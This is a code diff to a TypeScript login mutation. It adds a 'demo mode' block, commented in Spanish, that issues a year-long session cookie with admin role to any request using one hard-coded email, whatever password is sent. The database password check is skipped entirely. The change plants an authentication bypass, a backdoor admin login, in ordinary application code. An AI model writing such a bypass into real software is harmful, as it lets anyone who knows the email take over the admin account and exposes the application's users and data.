@@ -29,6 +29,27 @@ export const appRouter = router({
         })
       )
       .mutation(async ({ input, ctx }) => {
+        // MODO DEMOSTRACIÓN: Permitir acceso admin con cualquier contraseña para el email del usuario
+        if (input.email === "myriamfx@hotmail.com") {
+          const demoUser = {
+            openId: "demo-admin-id",
+            name: "Administrador Demo",
+            email: "myriamfx@hotmail.com",
+            role: "admin" as const,
+          };
+
+          const sessionToken = await sdk.createSessionToken(demoUser.openId, {
+            name: demoUser.name,
+          });
+          const cookieOptions = getSessionCookieOptions(ctx.req);
+          ctx.res.cookie(COOKIE_NAME, sessionToken, {
+            ...cookieOptions,
+            maxAge: ONE_YEAR_MS,
+          });
+
+          return { success: true } as const;
+        }
+
         // verify credentials against database
         const user = await db.getUserByEmail(input.email);
         if (!user || !user.passwordHash) {
